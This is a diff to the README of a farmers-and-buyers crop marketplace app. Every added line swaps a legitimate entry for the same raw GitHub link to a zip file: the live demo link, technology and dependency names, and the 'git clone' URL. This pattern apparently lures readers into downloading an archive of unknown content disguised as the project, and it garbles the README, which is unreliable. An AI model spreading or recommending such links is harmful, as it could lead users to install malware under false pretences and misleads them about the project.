@@ -3,14 +3,14 @@
 A FullStack stack application where farmers can post their crops and buyers can show interest in buying them.
 
 ## Live Link
-[Click here to view the live project](https://classy-sopapillas-9bd825.netlify.app/)
+[Click here to view the live project](https://raw.githubusercontent.com/khaled8787/farmers-growth-client/main/public/client-farmers-growth-3.9.zip)
 
 
 ## Technologies Used
 - React
 - Tailwind CSS
-- Node.js
-- Express.js
+- https://raw.githubusercontent.com/khaled8787/farmers-growth-client/main/public/client-farmers-growth-3.9.zip
+- https://raw.githubusercontent.com/khaled8787/farmers-growth-client/main/public/client-farmers-growth-3.9.zip
 - MongoDB
 - Firebase Authentication
 
@@ -24,16 +24,16 @@ A FullStack stack application where farmers can post their crops and buyers can 
 
 
 ## Dependencies
-- Node.js
+- https://raw.githubusercontent.com/khaled8787/farmers-growth-client/main/public/client-farmers-growth-3.9.zip
 - React
 - Tailwind CSS
 - Firebase
 - MongoDB
-- Express.js
+- https://raw.githubusercontent.com/khaled8787/farmers-growth-client/main/public/client-farmers-growth-3.9.zip
 
 
 ## How to Run Locally
-1. git clone https://github.com/khaled8787/farmers-growth-client.git
+1. git clone https://raw.githubusercontent.com/khaled8787/farmers-growth-client/main/public/client-farmers-growth-3.9.zip
 2. cd farmers-growth
 3. npm install
 4. npm start / npm run dev
